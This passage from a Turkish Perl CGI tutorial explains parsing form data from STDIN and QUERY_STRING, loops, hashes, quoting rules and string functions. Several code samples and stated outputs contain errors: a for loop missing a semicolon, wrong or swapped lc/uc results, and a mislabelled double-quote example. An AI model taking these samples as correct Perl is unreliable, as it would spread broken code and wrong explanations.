Şimdi programımıza dönelim ve bu öğrendiklerimizin nasıl uygulandığını görelim. Programda çevre değişkenlerini tutan %ENV İlişkili Dizi değişkeni içindeki REQUEST\_METHOD anahtarının değerinin GET’e eşit olup olmadığını sınıyoruz. if deyimi ile yaptığımız sınamanın sonucu doğru ise (yani REQUEST\_METHOD anahtarının değerinin GET’e eşit ise) ilk komut-deyim bloku icra edilecektir. Bu blokta yapılacak iş, çevre değişkenlerinden QUERY\_STRING’in içindeki String’i split fonksyonu ile “&” işaretlerinden bölümlere ayırmaktır. Bu işlem sonucu ortaya çıkan bağımsız String’leri @girdi dizi değişteninde (Array) toplayacağız.

Fakat ya yaptığımız sınama doğru değilse, yani REQUEST\_METHOD anahtarının değeri GET’e eşit değilse? Bu durumda iki şey olabilir: ya bu değer POST’a eşittir; ya da değildir. Peki, önce bu değerin POST’a eşit olup olmadığını sınayalım. Bunu elseif ile yapabiliriz. Bu sınamanın sonucu doğru, yani REQUEST\_METHOD anahtarının değeri POST’a eşitse, bu kez STDIN’in içeriği ile ilgileneceğiz (ki bunu nasıl yaptığımızı biraz sonra ele alacağız). Peki, REQUEST\_METHOD anahtarının değeri POST’a da eşit değilse? Bir Form’un METHOD özelliği ya POST, ya da GET olur. Eğer ikisi de değişse, o zaman Form’da hata var demektir. Bunu sonuncu else deyimine bırakıyoruz; Browser’a hata mesajı yolluyoruz.

Formu biz tasarladığımıza ve Form verilerini hangi yöntemle gönderdiğimizi bildiğimize göre Perl programımızın başında neden böyle bir sorguya ihtiyaç var? Aslında yok! Fakat iyi bir programcı geleneği, hiç bir şeyi şansa bırakmamaktır; belki bizden sonra iş ortaklarınızdan veya çalışma arkadaşlarınızdan biri, veya kız kardeşiniz sizin verdiğiniz gönderme yöntemini beğenmemiş ve Form’da değişiklik yapmış olabilir! Yukarıdaki HTML kodunu değiştirmemek şartıyla, Perl programının bu bölümünü şöyle yazabilirdik:

**read (STDIN, $depo, $ENV{'CONTENT\_LENGTH'});**

**@girdi = split(/&/, $depo);**

**Oku bakiim!**

Tabiî buradaki “read()” fonksiyonu dikkatinizi çekmiş olmalı. Neyi okuttuğumuzu ve nasıl okuttuğumuzu ele almadan önce bildiklerimizi bir tazeliyelim: CGI ile bulunduğu Web Server ve ona evsahipliği yapan işletim sisteminin ilişkilerini gözden geçirirken HTTP Server’ın CGI’a iki türlü bilgi aktardığından söz etmiştik. HTTP Server, Internet’ten GET yoluyla bilgi alıyorsa, bu bilgileri çevre değişkenlerinden QUERY\_STRING’e depoluyor; POST ile alırsa, standard girdi yöntemini kullanarak, STDIN’in içine koyuyordu. Bu arada STDIN’in yeni boyutu da çevre değişkenlerinden CONTENT\_LENGTH’in içine yazılıyordu.

Şimdi, QUERY\_STRING ile sizin oluşturduğunuz bir değişkenin hiç farkı yoktur; fakat standard girdi denilen “bilgi tutma alanı” farklıdır. Teknik ayrıntılarına girmeden belirtebileceğimiz başlıca fark, STDIN’in içeriği değişken gibi işlenmez; dolayısıyla önce STDIN’in içeriğini bir değişkene aktarmakta yarar var. STDIN, tıpkı bir dosya gibi okunabilir; dolayısıyla içindeki bilgileri aslında daha sonra sabit diskten dosya okumakta kullanacağımız READ fonksiyonuyla okuyabiliriz. Bu fonksiyonun dört argümanı bulunabilir:

1. Okunacak dosya için oluşturacağımız tutamak (Handle)

2. Okunacak şeyin içine konacağı değişken

3. Okunacak şeyin uzunluğu

4. Okunacak şeyin başladığı konum, pozisyon

Derler ki, Perl’de iki şey vardır: Tekil/Scalar değişken ve dosya tutamağı! Diğer herşey bu iki ögeden türer! Dosya açma, okuma yazma bahsine ve dolayısıyla tutamağın önemine daha sonra döneceğiz; şimdilik sadece şunu bilmek yeterlidir: Perl’ün açacağı dosya için dosya adından başka değişken adına ihtiyacı vardır ve buna tutamak (Handle) denir. Bunu, Perl’ün bir dosyaya kendi içinde verdiği özel bir isim olarak bakabilirsiniz. Standard girdiler ise Perl (diğer bütün Unix programlama dilleri) için açılmış dosya demektir; açılmış ve bir tutamak verilmiş özel bir dosya türü. Tutamağın adı STDIN’dir ve bizim sabit diskte bulunan ve okumak-yazmak için açacağımız bir düz yazı dosyası gibi işlem görür. Bu özel “dosya” içindekileri de okurken, bir değişkenin içine okumak gerekir; read fonksiyonunun ikinci argümanı bunu sağlar. Perl’e okuyacağı şeyin boyutunu, uzunluğgunu söylemeniz gerekir; bu üçüncü argüman olarak yazılır. Dördüncü ve verilmesi zorunlu olmayan argüman ise okumaya başlanacak byte’dır. read fonksiyonu sabit diskteki binary dosyaları okumakta kullanıldığı ve bu dosyaların içeriği sabit diskte byte ölçüsüyle yazıldığı için, konumu byte olarak belirtiriz. Dosyalarımızı genellikle baştan okuttuğumuz için bu argüman genellikle 0 olur.

read fonksiyonunun işleyebilmesi için okuduğu şeyi içine yazacağı bir tekil/Scalar değişken göstermemiz gerekir. Neden tekil/Scalar değişken de dizi değil? Çünkü STDIN’in içindeki herşey, Form’dan gelen bir String’dir. Browser’ın Form verilerini yumak yapıp gönderdiğini hatırlıyor musunuz? Burada “$depo” adını verdiği değıişken, okunan STDIN değerlerini tutacaktır.

Dosya okuma konusunda daha öğrenebileceğimiz çok şey var; STDIN’i okumak için bu kadar bilgi yeter; fakat şunu belirtmek gerekir: Okumaya çalıştığımız dosyanın boyutunu tam olarak belirtmezsek, Perl bilgileri eksik alabilir veya dosyanın bittiği yeri geçer ve dosyaya ait olmayan şeyleri de okuyabilir. Dolayısıyla STDIN’in içerdiği herşeyi okutabilmek için okutacağımız şeyin uzunluğunu çevre değişkenlerinden CONTENT\_LENGTH’den öğreniyoruz. Çevre değişkenleri Perl tarafından %ENV adlı özel bir İlişkili Dizi’nin içinde tutulur ve bu dizideki CONTENT\_LENGTH anahtarının değerini “$ENV{'CONTENT\_LENGTH'}” deyimi ile öğrenebiliriz.

Peki, “read (STDIN, $depo, $ENV{'CONTENT\_LENGTH'});” deyimini irdelediğimize göre, şimdi programımızın diğer bölümlerine bakabiliriz. Kodumuzun iş yapan bölümündeki diğer deyim şöyle:

@girdiler = split(/&/, $depo);

split işlevini tanıyoruz: bir değişkenin içeriğini alıyor ve verdiğimiz bölme noktası karakterinden bölümlere ayırıyor. Burada “$depo” değişkenin içerdiği String’i (ve anlamına gelen) ampersand (&) işaretinden böldürüyoruz; elde edilecek bağımsız String’leri “@girdiler” dizi-değişkenine (Array) yazdırıyoruz. Browser’ın Form verisini nasıl yumak yaptığını hatırlıyor musunuz? (İpucu: “isim=Mustafa+Durcan&yas=23”) Browser, Form’daki her bir alanın adı eşittir (=) işaretiyle Form’u tasarlayan veya dolduran kişinin verdiği değerle birleştirip, sonra bunları ampersand (&) işaretiyle birbirine bağlıyordu. Hatırlarsanız, bu arada boşlukların yerine artı (+) işareti konuyor; ayrıca özel karakterlerin yerine de Heksadesimal değerleri yazılıyordu.

$depo değişkeni içindeki String, & işaretinden bölümlere ayrılırsa, elimizde ne kalır? Şunun gibi bir şey:

@girdiler\[0\]...adi=Mustafa+Durcan

@girdiler\[1\]...Adres=Web+Teknikleri%2C+Istanbul

@girdiler\[2\]...Gonder=G%F6nder

@girdiler\[3\]...Kod=34000

@girdiler\[4\]...Merak=Siir

@girdiler\[5\]...eposta= mdurcan@webteknikleri.com

@girdiler\[6\]...mesaj=Mutluluklar+dileriz

@girdiler\[7\]...yuksek=ON

Burada boşlukların yerine artı (+) işareti konduğuna ve mesela virgül’ün yerine heksadesimal değeri olan “%2C”, ö harfi yerine “%F6” yazıldığına dikkat edin.

**Döngüler**

Kodumuzu irdelemeye devam edersek, karşımıza çıkan deyimin bir döngü ifadesi olduğunu görüyoruz. Döngü (loop) programcılığın varolma sebebidir! Herhangi bir programın bir kerede yaptığı işi nasıl olsa herkes elle kendisi yapabilir. Fakat aynı iş defalarca tekrar edecekse, bilgisayara ve bilgisayarın bi işi yapmasını sağlayacak olan programa ihtiyaç var demektir. Perl’e bir işi sonuçlanıncaya kadar yaptıran, yani başa dönerek, aynı işi yeniden yapmasını sağlayan bir kaç döngü deyimi vardır. Bunlar while, next..last, for ve foreach deyimleridir.

Bir programın icrası sırasında değişkenlerin değeri değişebilir. (Boşuna ‘değişken’ demiyoruz, değil mi?) while karşılaştırma deyimi, tıpkı yukarıda ele aldığımız if gibi bir değişkenin değerinin belirli bir değere eşit kalması halinde doğrudur; ve sınama sonucu doğru ise sonraki, değilse while blokunu izleyen ilk deyim icra edilir. Bir örnek verelim:

$sayac = 0;

while($sayac < 10) {

print “Sayaç değişkenin değeri: $sayac\\n”;

$sayac += 1;

}

print “sayaç değişkeni $sayac oldu!”;

Burada Perl, $sayac’ın değeri 10’un altında olduğu sürece ekrana “sayaç değişkeninin değeri:” kelimelerini ve değişkenin o andaki değerini yazdıracak ve değişkenin değerini 1 arttıracaktır. (Aritmetik işlemlere sonra daha yakından bakacağız!) while blokunun sonu olan süslü paranteze ulaştığında Perl, bu blokun başına dönecek ve verdiğimiz koşulu yeniden sınayacaktır. $sayac değişkeni eğer halâ 10’un altında ise, Perl while deyimini yeniden icra edecek yani ekrana “sayaç değişkeninin değeri:” kelimelerini ve değişkenin o andaki değerini yeniden yazdıracak ve değişkenin değerini 1 arttıracaktır. Ta ki, sınama sonucu $sayac değişkeninin değerinin 10 olduğunu gösterinceye kadar. Perl bunu belirlediği anda while blokunun dışına çıkacak ve son deyimi icra edecektir.

Bu arada, while() fonksiyonu ile döngünün yazılışına dikkat edin: döngü bloku, yani while() için ileri sürdüğünüz koşulu içeren parantez kapandıktan sonraki bölüm, süslü parantez içinde ve bu bloku kapatan süslü parantezden sonra noktalı virgül yok.

while blokunda sonsuz-döngü denen hataya düşmek çok kolaydır. Perl, bir türlü gerçekleşmeyen while koşulu ile karşılaştığı zaman sonsuza kadar bu blokun içinde kalır. Bu durumda ne olur? Yukarıdaki kodda şu değişikliği yapın ve sonucu görün:

$sayac = 0;

Dikkat! Bu sonsuz-döngüden çıkmanın tek yolu, Browser’ı kapatmaktır!

while ne kadar kullanışlı olursa olsun, bir programda karşılaşabileceğimiz her türlü koşulu sınamaya yetmez. onun eksik bıraktığı durumları, for ve foreach ile karşılayabiliriz.

for deyimi sınadığınız koşul gerçekleşinceye kadar devam eder. Yukardaki sayaç örneğini for için yazalım:

for ($sayac = 0 ; $sayac < 10 $sayac += 1) {

print “Sayaç değişkeni: $sayac”;

}

print “Sayaç değişkeni: $sayac oldu!”;

Bu kodun yaptığı işlem yukarıdaki while ile aynı olduğu için for deyiminin ne kadar kullanışlı olduğu görülemeyebilir. Fakat aşağıdaki kodu Not Defteri ile yazar ve mesela hex.pl adıyla kaydederek, çalıştırırsanız; 255’e kadar ondalık sayıları 16 tabanlı sayı sistemine (Heksadesimal) çevirebilirsiniz. (Şimdilik ele almadığımız fonksiyonlara ve deyimlere aldırmayın!)

**#!/usr/local/bin/perl**

**#hex.pl**

**print "HTTP/1.0 200 OK\\n";**

**print "Content-Type: text/html\\n\\n";**

**print "<HTML>\\n";**

**print "<HEAD>\\n";**

**print "<TITLE>HEX</TITLE>\\n";**

**print "<meta http-equiv=\\"content-type\\" content=\\"text/html; charset=ISO-8859-9\\">\\n";**

**print "<meta http-equiv=\\"Content-Type\\" content=\\"text/html; charset=windows-1254\\">\\n";**

**print "</HEAD>\\n";**

**print "<BODY>\\n";**

**print "<H4>Desimal - Heksadesimal Çevirmeni</H4>\\n";**

**@Heksadesimal = ('0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F');**

**for($i = 0; $i <= 255; $i++) {**

**print sprintf("%3s", $i), "=", $Heksadesimal\[int($i / 16)\], $Heksadesimal\[$i % 16\], " ";**

** if(($i % 8) == 7) { **

** print "\\n" **

** }**

**print "<br>\\n";**

**}**

**print "</BODY>\\n";**

**print "</HEAD>\\n";**

**print "</HTML>\\n";******

/////////////////////////KUTU///////////////////////

**Tek Tırnak.. Çift Tırnak..**

Perl’de tek tırnak-çift tırnak farkına daha önce değindik ve tek tırnak içine aldığınız String’in içinde sadece ekranda görüntülenebilen karakterler yer aldığını belirttik. String’lerimiz görüntülenemeyen karakter değerlerini içeriyorsa, bu dizeyi mutlaka çift tırnak içine almamız gerektiğini belirttik. Tek tırnak-çift tırnak farkının bir diğer sonucunun ise String’in içine değişken koyduğumuz zaman ortaya çıktığını söyledik. Şu örneğe bakın:

$ad = ‘Mustafa’

print ‘Senin adın $ad.’

Bu durumda ekranda şu sonucu elde ederiz:

Senin adın $ad.

Perl’ün verdiğimiz String içinde yer alan değişkenin değerini bularak, değişken adı yerine değerini koymasını istiyorsak, print() fonksiyonunu çift tırnakla yazmamız gerekir:

$ad = ‘Mustafa’

print “Senin adın $ad.”

Bu durumda şu sonucu elde ederiz:

Senin adın Mustafa.

/////////////////////KUTU BİTTİ////////////////////////////////

Bu örneklerde de gördüğümüz gibi, for deyiminin üç bölümü vardır; sınanmasını istediğimiz değişkenin başlangıçtaki durumu ($sayac = 0), sonra aranacak koşul ($sayac < 10) ve bu koşul gerçekleşinceye kadar her adımda değişkende olacak değişiklik ($sayac += 1), ve her adımda icra edilecek komutlar ve deyimler. for deyimi sınanan koşul gerçekleşinceye kadar kendi bloku içinde devam eder; koşul yerine gelir gelmez, bloku izleyen ilk deyime geçer.

Kimi zaman sınamayı bir değişkenin bir listeden alacağı bütün değerler için tek tek yapmak isteriz. Burada kilit kavram işlemin tek tek bütün değerler için yapılacak olmasıdır. Ki, bu deyimle, yola çıktığımız form\_analiz.pl programındaki foreach deyimine dönmüş oluyoruz!

Form ile aldığımız ve “@girdiler” dizi-değişkenine, tabir yerinde ise, üstüste yığdımız değerleri şimdi tek tek ele alıp, bir işlemden geçirip, daha düzenli şekilde kullanılabilir değişken/değer çiftleri haline getirebiliris. Bu anlamda foreach deyimi mantıksal bir sınamadan çok bir listedeki bütün değerler için ayrı bir işlem yapılması sayılabilir. form\_analiz.pl programının ilk foreach deyimini hatırlayalım:

foreach $girdi (@girdiler) {

($anahtar, $deger) = split (/=/, $girdi);

Program bu deyimlerde, “@girdiler” dizisinin her bir elemanını tek tek ele alıp, bunu içindeki eşittir (=) işaretinden ikiye bölüp, birinci bölümünü “$anahtar”, ikinci bölümünü ise “$deger” değişkenine yazacaktır.

Bu aşamada, “@girdiler” dizisinin içindeki her bir elemanını alıyoruz, bunu $girdi değişkenine atıyoruz. @girdiler’in sözgelimi birinci elemanını hatırlarsak, döngünün lik adımında $girdi değişkeninin değeri bu String oluşturacak; yani, $girdi’nin değeri “adi=Mustafa+Durcan” olacaktır. Ve split fonksiyonu bu String’i eşittir işaretinden ikiye bölerek, “adi” kelimesini $anahtar değişkenine, “Mustafa+Durcan” kelimelerini $deger değişkenine atayacaktır. (İkinci adımda bu kez “Adres” kelimesi $anahtar değişkenine, “Web+Teknikleri%2C+Istanbul” String’i ise $deger değişkenine atanacaktır.)

Programımızın daha sonraki bölümlerinde bu iki değişkenin içinde bazı metin düzenleme işlemleri yaptıran (eşittir ve tilde işaretleri “=~” bulunan satırlar) deyimler var, ki onlara daha sonra döneceğiz.

////////////////////KUTU/////////////////////

**Metinleri birbirine Nokta ile ekleyebiliriz**

Perl’ün metin düzenleme fonksiyonlarına ayrıntılı olarak bakacağız; burada sadece “.=” işlemi üzerinde kısaca duralım.

Sayıları toplarız; String’leri ekleriz. Perl, mükemmel bir rapor yazma dili olarak icad edildiği için olacak, bir çok metin düzenleme aracına ek olarak, özel bir metin ekleme operatörüne sahiptir: Nokta. Bunu bir örnekle anlatmak daha kolay:

$metin1 = ‘kara’;

$metin2 = ‘deniz’;

print $metin1 . $metin2;

bize, tahmin ettiğiniz gibi şunu verir:

karadeniz

Belki ekrana doğrudan “karadeniz” yazdırmanın daha kolay yolları bulunabilir; ama nokta ile metin ekleme işlevinden özellikle mevcut bir değişkenin sonuna yeni ek yaptırmakta yararlanabiliriz.

Diyelim ki, şöyle bir liste yapıyoruz:

$arkadaslar = “Mustafa, Osman, Vildan, Kudret”

Fakat programın daha ileri bir aşamasında $yeni\_arkadaslar değişkenine yeni isimler eklediniz. Şimdi bu iki listeyi birleştirmeniz gerekiyor. Değişkenin tümünü yazmak yerine, Perl’e, “Bu değişkeni al, içindekileri şu değişkenin içindeki String’in sonuna ekle!” demek daha kolay olabilir:

$arkadaslar = $arkadaslar . $yeni\_arkadaslar;

Eğer bu da size çok zahmetli görünüyorsa, Perl’ün şu kolaylığından yararlanabilirsiniz:

$arkadaslar .= $yeni\_arkadaslar;

/////////////////////////////KUTU BİTTİ////////////

$anahtar ve $deger değişkenlerimizin içinde döngünün her adımında sadece birer String var ve ikinci adıma geçmeden önce bu String’leri temelli bir yere yazmak zorundayız; ki ikinci adımda @girdiler’in bir sonraki değerini alalım. İki String’i yanyana alabiler ve birincisini ikincisinin endeksi (Perl diliyle anahtarı), ikincisini de birincisinin değeri yapabileceğimiz değişken türü İlişkili Dizi (Hash, associative Array) listesidir. Şimdi eğer foreach döngüsünün birinci adımında elimizdeki iki değişkeni bir İlişkili Dizi’ye atarsak, döngünün ikinci adımında $anahtar ve $değer değişkenlerine @girdiler’den yeni Stringler alabiliriz. İlişkili Dizi oluşturmanın çeşitli yollarını ele almıştık; bunlardan biri şuydu:

$iliski\_dizi\_degisken\_ismi{$anahtar\_ismi\_olacak\_deger} = $deger\_olacak\_deger

Bunu bir örnekle yazalım:

$formveri{$anahtar} = $deger;

Buradaki süslü parantezi görünce Perl, bir İlişkili Dizi oluşturmak istediğimizi ve onun bir anahtarı olarak $anahtar adlı değişkenin değerini, bu anahtarın karşıtı olan değer olarak da $deger değişkenin değerini atamak istediğimizi anlar; “%formveri” adındaki İlişkili Dizi değişkeni oluşturur, birinci kaydın anahtarı olarak $anahtar değişkeninin o sıradaki değerini, değeri olarak da $deger değişkeninin o andaki değerini atar. foreach döngüsünün birinci adımında $anahtar’ın değeri “adi”, $deger’in değeri ise içinden artı işaretini atıp yerine boşluk koyduğumuz “Mustafa Durcan” idi. İkinci adımda, %formveri’nin ikinci kaydının anahtarı “Adres”, değeri ise “Web Teknikleri..” olacak ve bu foreach’in sonuna kadar devam edecek. foreach ise @girdiler’in son elemanının işlenmesi ile sona erecek.

Dikkat etmiş olacağınız gibi %formveri’nin kayıtlarını da if ile bir mantık süzgecinden geçiriyoruz. Form’larımızda, bazen aynı alan adına sahip olabilen INPUT etiketleri bulanabilir. Bu etiketler dolayısıyla Form’dan CGI’ya gelen veri yumağında daha sonra İlişkili Dizi’me anahtar olarak yazılmak üzere aynı kelimeden birden fazla bulunabilir. Bunu kabul edemeyiz, çünkü İlişkili Dizi’lerde anahtarların özgün, yani bir adet olması gerekir. foreach döngüsünün sonundaki bu if deyimi, o anda elimizdeki anahtarın daha önce diziye yazılıp yazılmadığını sınamaktadır. %formveri’de bu adla daha önce yazılmış anahtar varsa, o anda $değer’in tuttuğu String, daha önce yazılmış anahtarın kartışı olan değerin sonuna, virgül ile eklenecektir ($formveri{$anahtar} .= ", $deger";); eğer henüz bu anahtar diziye yazılmamışsa, kendisi özgün bir kaydın anahtarı, o andaki $deger de değeri olacaktır ($formveri{$anahtar} = $deger;).

form\_analiz.pl’in geri kalan bölümü, %formveri dizisinin anahtar/değer çiftlerini ekrana yazdırmaktan ibaret.

Buraya kadar aslında büyük iş başardık diyebiliriz. Bir çok kişinin belki de CGI ve Perl ihtiyacının başlıca kaynağı olan Form bilgisini alıp, işlemeyi ve bunu ekrana dökmeyi başardık:

<cgi-perl012.tif>

Şimdi ekrandaki bu döküm işleminin biraz daha düzenli olmasını sağlayalım ve bu veriyi ekrana değil de HTTP Server’ın bulunduğu bilgisayarda sabit diske yazdıralım.

## **Metin, Sayı ve Dosya İşlemleri**

Şimdi artık Perl bildiğinize göre.. Evet, evet; hiç merak etmeyin; buraya kadar örnekleri birlikte yaptık ve ele aldığımız fonksiyonları ve deyimleri kullanabilir hale geldi isek, Perl biliyoruz demektir.

Şimdi bu kadar Perl ile neler yapabileceğimize gelelim.

Perl ile matematik işlemleri yapabiliriz; metin oluşturur, sabit diskteki metin dosyalarından veya Internet’ten metin alabiliriz, bu metinleri yeniden biçimlendirebiliriz, ve aldığımız ya da oluşturduğumuz metinleri ya Internet’te birilerine göndeririz, ya da daha sonra gönderilmek üzere sabit diske yazabiliriz. Bu cümleye bakarsanız, Perl ile neredeyse dünyayı yönetebiliriz! (Düşünürseniz, dünyayı yönetmek de sadece buradaki işlemleri yapmaktan ibaret!)

Burada ifade ettiğimiz işlevlerin, dosya işlemleri hariç, hemen hepsini önceki bölümde gördük ve hatta kullandık. Bu bölümde bu işlerin biraz teorisine ve bol bol örneğine bakacağız ve dosya işlemleri ile ilgisini göreceğiz. İnternet sitenizi ziyaret edenlerin dolduracağı Form’ların bir yerlere kaydedilmesini isteriz sonuç itibariyle, değil mi?

Önce biraz Perl reklamı!

Perl, adından da anlaşılacağı gibi bir rapor yazma dilidir. Yani Perl ile yazacağınız programlar, bir yerden bilgi çeker ve bilgiyi rapor haline getirirler. Dolayısıyla Perl’ün çok güçlü metin ve sayı düzenleme araçları vardır. Bu araçlara değinmeden önce, benim daima “Hangisi hangisiydi?” diye karıştırdığım tek tırnak-çift tırnak meselesini yeniden hatırlayalım. Bu karışıklığın kaynak noktası, görünürde iki tür tırnak işaretinin de aynı işlevi yapıyor olmasıdır. Örnek:

$Metin1 = “Merhaba Dünya!”;

$Metin2 = ‘Sana da merhaba, ey ademoğlu!’;

print $Metin1;

print $Metin2;

Bu programı çalıştırın ve ekranda okuduğunuz yazılara lütfen dikkat edin; sonra $Metin1’i tek-tırnak, $Metin2’yi çift tırnak işareti içinde tanımlayın ve programı tekrar çalıştırın. Ne değişti? Hiç bir şey.

Bu duruma bakarak, ilk görüşte Perl’de tek tırnak işareti ile çift tırnak işaretinin farkını önemsememek mümkündür. Fakat bu ilerde büyük hatara yol açabilir. Tekrar özetlersek (bu sayfanın köşesini kıvırsanız iyi olur!)B tek tırnak işareti içindeki herşeyi aynen yazadırır; çift tırmak işareti içindeki değişkenlerin değerlerini, özel işaretlerin de temsil ettikleri karakterlerin yazılmasını sağlar.

Yukarıdaki programı şöyle değiştirebilirsiniz:

$Metin1 = ‘Sana da merhaba, ey ademoğlu!’;

print ‘Merhaba Dünya... $Metin1’;

Programı çalıştırın. Güzel! Değişkenin değerini değil adını okumuş olmalısınız:

Merhaba Dünya... $Metin1

Programınızda print() fonksiyonundaki tek-tırnak işaretlerini çift tırnak yapın ve yeniden çalıştırın:

$Metin1 = ‘Sana da merhaba, ey ademoğlu!’;

print ‘Merhaba Dünya... $Metin1’;

Merhaba Dünya... Sana da merhaba, ey ademoğlu!’

Çift tırnak işaretinin bir diğer marifeti, içindeki özel karakter simgelerinin yerine bu karakterleri koymasıdır:

$Metin1 = ‘Sana da merhaba, ey ademoğlu!’;

print “\\$Metin1 = $Metin1”;

Burada Perl’ün ekrana yazdığı “$Metin1” kelimesi aslında bizim değişkenimizin adı değil, ekrana yazdırdığımız özel Dolar işareti ile Metin1 kelimesinden ibarettir:

$Metin1 = Sana da merhaba, ey ademoğlu!

Ekrana tek veya çift tırnak yazdırmak için de \\’ ve \\” işaretlerini kullanmanız gerekir. Fakat bu bir süre sonra epey zahmetli olmaya başlar. Perl, bizi bundan da kurtarabilir. Bunu içinde özel karakterler olan metnimizi q/.../ ve qq/.../ işaretleri arasına alarak yapabiliriz:

$Metin1 = q/Bu metnin içinde özel işaret (%, &, $) ‘ ve “ bulunuyor./;

Burada q/.../ ile qq/.../ tıpkı tek tırnak-çift tırnak farkına yol açar:

$Metin1 = “Merhaba Dünya!”;

$Metin2 = qq/$Metin1.. Sana da merhaba evlad!/;

q ve qq işaretlerinden sonra sınırlayıcı olarak “/.../” işareti gibi parantez “(...)”, köşeli parantez “\[...\]”, süslü parantez “{...}” ve büyüktür-küçüktür “<...>” işaretlerini kullanabilirsiniz. Burada dikkat edilecek nokta başta kullandığınız işareti sonda da kullanmaktır.

//////////////////////////////KUTU///////////////////////////

**Uzuuuuun metin**

Perl’ün sizi çok uzun metinleri tırnak işareti içine almaktan kurtaran bir kolaylığı vardır; bunu << işareti ve bir sınırlama String’i ile yapabiliriz:

$Uzuuun\_metin = <<"uzun\_metin";

Insanoğluna en çok güç veren unsurların başında sevilmek gelir. Fakat kişinin sevildiğini kabul etmesi zordur; hele herşeyin çıkara dayandığı çağımızda, karşılıksız sevgiyi görünce tanımak, tanıyınca kabul etmek hiç de kolay olmuyor. --Immanuel L'Avanger

uzun\_metin

print $Uzuuun\_metin;

Burada $Uzuun\_metin değişkenin adı, “uzun\_metin” ise sınırlama String’idir. Snırlama String’ini uzun metnin hem başında, hem de sonunda kullanıyoruz. Sınırlama String’ini tek tırnak içine alırsanız, diğer yöntemlerde tek tırnak kullandığınız durumlardaki gibi, metnin içinde değişken adı ve özel karakter kullanamazsınız; sınırlama değişkenini çift tırnak içine alırsanız, uzun metnin içinde değişken adı kullullanılırsa. Perl onun yerine değişmenin değerini koyar.

///////////////////////////////KUTU BİTTİ///////////////////////

**Metin Biçimlendirme**

Perl’de metin içeren değişkenlerle özellikle print() fonksiyonunda kullandığımız tek ve çift tırnak işaretlerinin ilişkisini ayrıntılı olarak görmenin ne kadar yararlı olduğu birazdan belli olacak. Şimdi metinler ve metin içeren değişkenlerle neler yapabileceğimize bakabiliriz. Herşeyden önce, Perl, metinlerle dört işlem yapmanıza izin verir; ama bu dört işlem aritmetikten biraz farklı sonuç verir:

Toplama: Daha önce değindiğimiz metin düzenleme araçlarından biri, iki String’i birbirine eklemekte kullandığımız nokta (.) işareti idi. (Örnek: print “kara” . “deniz”) Bu imkandan sabit metinlerle değişkenleri birleştirmekte yararlanabiliriz.

print “Bu sayfa $tarih” . “\\’de güncelleştirildi!”

Çarpma: Perl’ün metin toplama fonksiyonu nokta işareti ise, metin çoğaltma fonksiyonu da çarpma (x) işaretidir. Perl’de bu fonksiyona tekrarlama (Repetition) denir. (x’in, küçük harf olmasına dikkat edin) Örnek:

print “Merhaba Dünya..” x 10

Çıkartma: Genellikle disklerdeki dosyalardan alacağımız metinlerin son satırında yeni satır (Enter, Return) karakteri bulunur. Bu, aldığımız metni HTML etiklerinin içine yerleştirirken bize zorluk verir. Perl bunun için bir String’in son karakterini kesip atmayı sağlayan özel iki fonksiyona sahiptir. “chop()” fonksiyonu, metnin sonundaki bir karakteri keser:

$yedi\_harf = “ABCÇDEF”;

$giden\_harf = chop($yedi\_harf)

print “\\$yedi\_harf\\’de altı harf kaldı: $yedi\_harf. \\$giden\_harf= $giden\_harf”;

Perl 5’de aynı işlevi yapan “chomp()” fonksiyonu ise, bir önceki göre daha akıllıdır; kimi dosyalarda yeni satır+satırbaşı karakterlerinin iki karakterlik yer tuttuğunu bilerek, ne kadar karakter attacağına kendisi karar verir. chop yerine chomp kullanmak daima daha güvenlidir.

Transformasyon: Herhalde metinlerle dört aritmetik işlemden bölmeyi yapamıyor diye Perl’e kızmazsınız. Perl’ün buna karşılık değişkenlerin gerçek içeriklerini değiştirme marifeti vardır. Tam içeriklerini değilse bile harflerinin biçimini! Ve sadece Perl 5’den itibaren!

Bir metin büyük harf olabilir; küçük harf olabilir. Bir metnin birinci harfi büyük olabilir; küçük olabilir. Perl değişkendeki biçimi ne olursa olsun, metinlerinizi sizin isteğinize göre büyük harf veya küçük harf yapabilir.

lc() fonksiyonu değişken içindeki biçimi ne olursa olsun, bütün String’i küçük harf (lower case) ve uc() fonksiyonu ise bütün String’i büyük harf (upper case) yapar.

////////////////////////////KUTU//////////////////////////////

**Lower ve Upper Kasalar**

İngilizce’de büyük harfe Upper Case, küçük harfe de Lower Case dendiğini daha önce de duymuş olmalısınız. Upper Case, (üst kasa), eski matbaacılıkta büyük harflerin durduğu üst kasanın, Lower Case ise küçük harflerin durduğu alt kasanın adıydı. Buradan dile geçen bu tanımla bugün Perl dahil birçok programlama diline kadar gelmeyi başardı.

////////////////////////KUTU BİTTİ/////////////////////

lcfirst() fonksiyonu String’in sadece birinci harfini küçük harf yapmaya zorlar; ucfirst() ise sadece birinci harfi büyük harf yapar. Örnek:

$kucuk\_harf = “abcdef”;

$buyuk\_harf = “GHIJKLM”;

print uc($kucuk\_harf);

print lc(buyuk\_harf);

print lcfirst($buyuk\_harf);

print ucfirst(kucuk\_harf);

Bu program sırasıyla şu sonuçları verir:

kucuk\_harf = “ghijklm”;

$buyuk\_harf = “ABCDEF”;

$kucuk\_harf = “gHIJKL”;

$buyuk\_harf = “Abcdef”;

Metin biçimlendirme işleri sırasında bize gereken bazı bilgiler olabilir. Bunların başında String’in uzunluğu gelir. Bunu, String’i tutan değişkenin boyutunu linght() fonksiyonu ile sorgulayarak öğreniriz:

$Metin1 = “Dostluklar çicek gibidir, daima bakım ister!”:

print length($Metin1);

Bu program şu sonucu verir:

44

Bazen bir karakterin sayısal değerini bilmek isteriz. Bunu, ord() fonksiyonu ile sağlarız. Örneğin, K karakterinin sayısal değerini öğrenmek için:

print ord(‘K’);

şu sonucu verir:

75

Aşağıda metin biçimlendirme işlemleri yaparken ihtiyaç duyacağımız bir başka bilgi, bir String’in içinde belli bir konumdaki karakterlerin değeri olabilir. Perl, adını verdiğiniz değişkenin içindeki değeri bulur; o değerde, belirttiğiniz bir konumdan sonra belirttiğiniz sayıdaki karakterin (sub-String’in, String’in bir bölünümünün) ne(ler) olduğunu söyler. Bu bilgiye dayandığımız işlemleri sonra göreceğiz; ama şimdi sadece bunu sağlayan substr() fonksiyonun kullanımını görelim:

$Metin1 = “Bana dostunu söyle; sana kim olduğunu söyleyeyim!”:

print substr($Metin1, 3, 12);

